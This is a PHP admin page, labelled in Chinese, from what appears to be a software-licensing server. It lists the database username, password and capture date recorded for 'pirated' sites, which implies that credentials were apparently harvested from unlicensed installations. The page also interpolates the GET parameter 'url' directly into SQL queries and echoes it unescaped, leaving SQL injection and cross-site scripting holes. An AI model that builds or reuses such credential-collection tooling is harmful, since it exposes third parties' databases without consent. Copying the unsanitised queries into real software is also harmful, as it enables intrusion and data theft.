<?php
/**
 * 获取密码
**/
$mod='blank';
include("../api.inc.php");
$title='盗版站点信息';
include './head.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
?>
  <div class="container" style="padding-top:70px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
<?php
if($udata['per_sq']==0) {
	showmsg('您的账号没有权限使用此功能',3);
	exit;
}

$url = $_GET['url'];

$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
if($row['active'] != 1){}else exit("<script language='javascript'>alert('此站点位于正版列表内！');history.go(-1);</script>");

$db=$DB->get_row("SELECT * FROM auth_block WHERE url='$url' limit 1");
?>
      <div class="panel panel-primary">
        <div class="panel-heading"><h3 class="panel-title">获取密码</h3></div>
          <ul class="list-group">
          <ul class="list-group">
            <li class="list-group-item"><span class="glyphicon glyphicon-tint"></span> <b>站点网址：</b> <?=$url?></a></li>
            <li class="list-group-item"><span class="glyphicon glyphicon-user"></span> <b>数据库账号：</b> <?=$db['name']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-lock"></span> <b>数据库密码：</b> <?=$db['pwd']?></li>
              <li class="list-group-item"><span class="glyphicon glyphicon-time"></span> <b>入库时间：</b> <?=$db['date']?></li>
          </ul>
      </div>